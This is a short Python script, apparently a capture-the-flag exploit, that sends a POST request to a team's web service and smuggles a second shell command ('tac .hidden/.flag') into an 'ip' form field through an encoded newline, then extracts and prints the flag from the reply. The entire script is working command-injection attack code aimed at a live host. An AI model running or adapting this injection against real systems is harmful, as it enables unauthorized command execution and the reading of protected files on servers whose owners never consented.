#!/usr/bin/env python3
import urllib.request
import urllib.parse
import sys

# Получаем IP команды из аргументов
team_ip = sys.argv[1] if len(sys.argv) > 1 else "10.24.249.158"

url = f"http://{team_ip}:5000/"
data = 'ip=1.1.1.1%0A tac .hidden/.flag'.encode()

req = urllib.request.Request(url, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'})
response = urllib.request.urlopen(req)
html = response.read().decode()

if 'flag{' in html:
    flag_start = html.find('flag{')
    flag_end = html.find('}', flag_start) + 1
    flag = html[flag_start:flag_end]
    print(flag, flush=True)
else:
    print("Флаг не найден", flush=True)
